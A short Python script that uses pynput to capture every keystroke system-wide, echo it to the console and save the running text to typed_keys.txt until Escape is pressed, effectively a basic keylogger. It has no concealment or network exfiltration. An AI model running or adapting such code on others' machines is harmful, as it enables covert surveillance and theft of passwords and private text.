from pynput.keyboard import Key, Listener

# Define a variable to hold the typed text
typed_text = ""

# Function to handle key press
def on_press(key):
    global typed_text
    try:
        # Check if the key is a regular character key
        typed_text += key.char
        print(key.char, end='', flush=True)  # Optionally, print the key to console
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        if key == Key.space:
            typed_text += ' '  # For space key
            print(' ', end='', flush=True)
        elif key == Key.enter:
            typed_text += '\n'  # For Enter key
            print('\n', end='', flush=True)
        elif key == Key.backspace:
            typed_text = typed_text[:-1]  # Handle backspace (delete the last character)
            print('\b \b', end='', flush=True)  # Visual backspace in the console
        elif key == Key.tab:
            typed_text += '\t'  # Handle tab key
            print('\t', end='', flush=True)

    # Optionally, you can log the text to a file here (e.g., typed_text)
    with open("typed_keys.txt", "w") as file:
        file.write(typed_text)

# Function to handle key release (to stop when Escape key is pressed)
def on_release(key):
    if key == Key.esc:
        # Stop listener if escape key is pressed
        return False

# Start listening to the keyboard
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
